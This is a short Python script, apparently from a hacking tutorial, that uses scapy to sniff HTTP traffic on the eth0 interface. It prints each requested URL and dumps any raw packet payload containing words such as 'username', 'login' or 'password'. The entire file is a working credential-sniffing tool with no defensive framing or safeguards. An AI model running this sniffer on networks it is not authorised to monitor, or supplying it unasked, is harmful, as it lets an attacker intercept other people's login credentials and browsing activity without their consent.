# By default the terminal have limit of 500 lines scrollback but you can chage it in settings

import scapy.all as scapy
from scapy.layers import http


''' Main function that performs all the task it call sniff function 
    from scapy and pass the callback function to itto process the 
    captured packet '''
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


# Gets url from packet
def getUrl(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


# Extracts login information
def extractLoginInfo(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "pass", "password"]
        for keyword in keywords:
            if keyword in load:
                return load


# This is callback function that is used to process the captured packet
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = getUrl(packet)
        print(f"[+] HTTP Request ->>  {str(url)}")

    login_info = extractLoginInfo(packet)
    if login_info:
        print(f"\n\n Username and Password ->> {login_info}\n\n")

   
# Calls sniff funciton
def start_sniff(interface):
    sniff(interface)


if __name__ == "__main__":
    sniff("eth0")